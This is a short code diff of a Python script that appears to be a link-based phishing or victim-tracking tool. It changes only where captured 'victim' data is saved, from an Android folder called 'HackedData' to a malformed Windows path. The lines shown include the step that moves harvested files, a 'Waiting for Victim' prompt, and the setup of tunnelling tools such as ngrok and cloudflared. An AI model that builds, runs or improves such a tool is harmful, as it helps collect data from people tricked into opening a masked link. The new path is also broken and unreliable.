@@ -389,7 +389,7 @@ def getLog():
         deviceData = open(".server/data.json", "r").read()
         printDetails(deviceData)
     
-    os.system(f"mv ./.server/*{ext} /sdcard/HackedData/{head}{body}{ext}")
+    os.system(f"mv ./.server/*{ext} /C:/Users/Administrator/Desktop/Link-X-main/{head}{body}{ext}")
     
 
 # Start Process
@@ -434,7 +434,7 @@ def startProcess():
         if (maskedUrl):
             cPrint("\n[cGreen~cWhite] URL 03cGreen: cWhite" + maskedUrl)
     
-    cPrint("\n[cGreen*cWhite] Data Saved In cGreen: cWhite/sdcard/HackedData")
+    cPrint("\n[cGreen*cWhite] Data Saved In cGreen: cWhite/C:/Users/Administrator/Desktop/Link-X-main")
     cPrint("\n[cGreen*cWhite] Waiting for Victim, Press cGreenCtrl cWhite+ cGreenc cWhiteto Stop...\n")
     
     try:
@@ -494,7 +494,7 @@ if (__name__ == "__main__"):
     if (any(sb.getoutput(f"command -v {pkg}") == "" for pkg in ["php", "ngrok", "cloudflared", "curl", "wget", "unzip"])):
         os.system("python setup.py")
     
-    if not os.path.exists("/sdcard/HackedData"):
-        os.mkdir("/sdcard/HackedData")
+    if not os.path.exists("/C:/Users/Administrator/Desktop/Link-X-main"):
+        os.mkdir("/C:/Users/Administrator/Desktop/Link-X-main")
     killAll()
     menu()
